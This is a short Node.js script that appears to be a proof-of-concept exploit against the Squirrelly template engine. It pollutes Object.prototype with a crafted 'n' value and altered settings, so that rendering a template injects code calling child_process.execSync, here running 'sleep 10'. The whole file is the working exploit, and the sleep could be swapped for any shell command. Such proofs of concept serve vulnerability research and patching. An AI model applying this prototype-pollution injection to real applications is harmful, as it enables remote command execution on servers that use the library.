var sqrl = require('squirrelly')
const path = require('path')


templatePath = path.join(__dirname+'/views/', 'each.sqrl');

Object.prototype.n = "each')\nprocess.mainModule.require('child_process').execSync('sleep 10');\n//"
Object.prototype.settings = {
   'view options':{
      prefixes: {
         s: '',
     }
   }
};

sqrl.renderFile(templatePath, { kids: ['Ben', 'Polly', 'Joel', 'Phronsie', 'Davie'] });